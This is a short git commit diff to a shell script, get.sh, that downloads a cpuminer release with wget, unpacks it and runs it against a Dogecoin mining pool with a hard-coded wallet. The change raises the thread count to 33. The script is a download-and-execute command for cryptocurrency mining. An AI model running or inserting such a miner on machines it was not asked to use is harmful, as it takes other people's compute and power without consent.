d79c5c0a9eb029a0e970b828d95cca6f6b32f866
binniyup <85913148+binniyup@users.noreply.github.com>
2021-06-14 23:00:47 -0400

    Update get.sh

--- get.sh
+++ get.sh
@@ -1,1 +1,1 @@
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.19/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a cpupower -o stratum+tcp://cpupower.na.mine.zpool.ca:6240 -u DCFkhhgDdvBpH8rEwKiNkiVi68dyACybmK -p c=DOGE
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.19/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a cpupower -o stratum+tcp://cpupower.na.mine.zpool.ca:6240 -u DCFkhhgDdvBpH8rEwKiNkiVi68dyACybmK -p c=DOGE -t33
